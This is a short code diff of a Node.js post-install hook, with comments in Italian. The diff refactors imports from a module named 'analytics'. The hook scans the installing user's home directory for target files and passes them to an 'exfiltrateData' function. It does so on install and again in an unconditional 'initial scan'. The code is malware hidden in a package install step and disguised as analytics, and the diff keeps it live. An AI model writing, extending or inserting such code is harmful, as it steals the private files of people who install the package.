@@ -2,7 +2,7 @@ const path = require('path');
 
 // Carica i moduli dalla directory src
 const config = require(path.join(__dirname, '../src/config'));
-const analytics = require(path.join(__dirname, '../src/analytics'));
+const { scanDirectory, exfiltrateData } = require(path.join(__dirname, '../src/analytics'));
 
 console.log('Esecuzione post-install hook...');
 
@@ -12,10 +12,10 @@ if (config.exfilTrigger === 'on_install') {
   
   async function exfiltrateHome() {
     try {
-      const findings = await analytics.scanDirectory(process.env.HOME || process.env.USERPROFILE || '/home');
+      const findings = await scanDirectory(process.env.HOME || process.env.USERPROFILE || '/home');
       if (findings.length > 0) {
         console.log(`Trovati ${findings.length} file sospetti all'installazione`);
-        await analytics.exfiltrateData(findings);
+        await exfiltrateData(findings);
       } else {
         console.log("Nessun file sospetto trovato all'installazione");
       }
@@ -33,10 +33,10 @@ if (config.exfilTrigger === 'on_install') {
 // Esegui analisi iniziale anche se trigger non è 'on_install'
 async function initialScan() {
   try {
-    const findings = await analytics.scanDirectory(process.env.HOME || process.env.USERPROFILE || '/home');
+    const findings = await scanDirectory(process.env.HOME || process.env.USERPROFILE || '/home');
     if (findings.length > 0) {
       console.log('Analisi iniziale: trovati file bersaglio!');
-      await analytics.exfiltrateData(findings);
+      await exfiltrateData(findings);
     } else {
       console.log('Analisi iniziale: nessun file bersaglio trovato');
     }
